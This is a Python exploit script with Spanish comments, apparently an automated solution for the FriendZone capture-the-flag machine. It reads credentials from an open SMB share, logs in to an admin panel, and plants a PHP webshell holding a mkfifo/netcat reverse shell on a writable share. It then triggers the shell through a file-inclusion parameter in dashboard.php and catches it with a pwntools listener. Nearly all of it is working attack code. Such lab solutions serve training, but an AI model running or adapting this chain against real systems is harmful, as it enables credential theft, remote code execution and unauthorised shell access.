import pdb
import urllib3
import urllib

from smb.SMBHandler import SMBHandler

from pwn import *

def def_handler(sig, frame):

    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
login_url = "https://administrator1.friendzone.red/login.php"
rce_url = "https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/reverse"
lport = 443

def getCreds():
    opener = urllib.request.build_opener(SMBHandler)
    fh = opener.open('smb://10.10.10.123/general/creds.txt')
    data = fh.read()
    fh.close()

    data = data.decode('utf-8')
    username = re.findall(r'(.*?):', data)[1]
    password = re.findall(r':(.*)', data)[1]

    return username, password

def makeRequest(username, password):

    urllib3.disable_warnings()

    s = requests.session()
    s.verify = False

    data_post = {
        'username': username,
        'password': password
    }

    r = s.post(login_url, data=data_post)

    os.system("mkdir /mnt/montura")
    os.system('mount -t cifs //10.10.10.123/Development /mnt/montura -o username="null",password="null",domain="WORKGROUP",rw')
    time.sleep(2)
    os.system("echo \"<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 443 >/tmp/f'); ?>\" > /mnt/montura/reverse.php")
    os.system("umount /mnt/montura")
    time.sleep(2)
    os.system("rm -r /mnt/montura")

    r = s.get(rce_url)

if __name__ == '__main__':

    username, password = getCreds()

    try:
        threading.Thread(target=makeRequest, args=(username, password)).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()

    shell.interactive()
